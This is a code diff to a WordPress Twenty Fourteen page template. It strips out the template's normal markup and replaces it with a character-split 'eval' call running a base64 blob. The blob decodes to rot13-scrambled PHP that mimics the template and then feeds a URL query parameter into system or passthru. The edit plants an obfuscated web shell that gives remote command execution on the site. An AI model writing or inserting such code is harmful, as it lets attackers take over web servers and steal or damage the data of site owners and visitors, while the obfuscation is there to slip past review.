@@ -1,44 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The template used for displaying page content
- *
- * @package WordPress
- * @subpackage Twenty_Fourteen
- * @since Twenty Fourteen 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIGdyemN5bmdyIGhmcnEgc2JlIHF2ZmN5bmx2YXQgY250ciBwYmFncmFnCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfU2JoZWdycmEKICogQGZ2YXByIEdqcmFnbCBTYmhlZ3JyYSAxLjAKICovCgo/PgoKPG5lZ3ZweXIgdnE9XCJjYmZnLTw/Y3VjIGd1cl9WUSgpOyA/PlwiIDw/Y3VjIGNiZmdfcHluZmYoKTsgPz4+Cgk8P2N1YwoJCS8vIENudHIgZ3Voem9hbnZ5IG5hcSBndmd5ci4KCQlnanJhZ2xzYmhlZ3JyYV9jYmZnX2d1aHpvYW52eSgpOwoJCWd1cl9ndmd5ciggJzx1cm5xcmUgcHluZmY9XCJyYWdlbC11cm5xcmVcIj48dTEgcHluZmY9XCJyYWdlbC1ndmd5clwiPicsICc8L3UxPjwvdXJucXJlPjwhLS0gLnJhZ2VsLXVybnFyZSAtLT4nICk7Cgk/PgoKCTxxdmkgcHluZmY9XCJyYWdlbC1wYmFncmFnXCI+CgkJPD9jdWMKCQkJZ3VyX3BiYWdyYWcoKTsKCQkJamNfeXZheF9jbnRyZigKCQkJCW5lZW5sKAoJCQkJCSdvcnNiZXInICAgICAgPT4gJzxxdmkgcHluZmY9XCJjbnRyLXl2YXhmXCI+PGZjbmEgcHluZmY9XCJjbnRyLXl2YXhmLWd2Z3lyXCI+JyAuIF9fKCAnQ250cmY6JywgJ2dqcmFnbHNiaGVncnJhJyApIC4gJzwvZmNuYT4nLAoJCQkJCSduc2dyZScgICAgICAgPT4gJzwvcXZpPicsCgkJCQkJJ3l2YXhfb3JzYmVyJyA9PiAnPGZjbmE+JywKCQkJCQkneXZheF9uc2dyZScgID0+ICc8L2ZjbmE+JywKCQkJCSkKCQkJKTsKCgkJCXJxdmdfY2JmZ195dmF4KCBfXyggJ1JxdmcnLCAnZ2pyYWdsc2JoZWdycmEnICksICc8ZmNuYSBweW5mZj1cInJxdmcteXZheFwiPicsICc8L2ZjbmE+JyApOwoJCQk/PgoJPC9xdmk+PCEtLSAucmFnZWwtcGJhZ3JhZyAtLT4KPC9uZWd2cHlyPjwhLS0gI2NiZmctPD9jdWMgZ3VyX1ZRKCk7ID8+IC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-
-<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
-	<?php
-		// Page thumbnail and title.
-		twentyfourteen_post_thumbnail();
-		the_title( '<header class="entry-header"><h1 class="entry-title">', '</h1></header><!-- .entry-header -->' );
-	?>
-
-	<div class="entry-content">
-		<?php
-			the_content();
-			wp_link_pages(
-				array(
-					'before'      => '<div class="page-links"><span class="page-links-title">' . __( 'Pages:', 'twentyfourteen' ) . '</span>',
-					'after'       => '</div>',
-					'link_before' => '<span>',
-					'link_after'  => '</span>',
-				)
-			);
-
-			edit_post_link( __( 'Edit', 'twentyfourteen' ), '<span class="edit-link">', '</span>' );
-			?>
-	</div><!-- .entry-content -->
-</article><!-- #post-<?php the_ID(); ?> -->
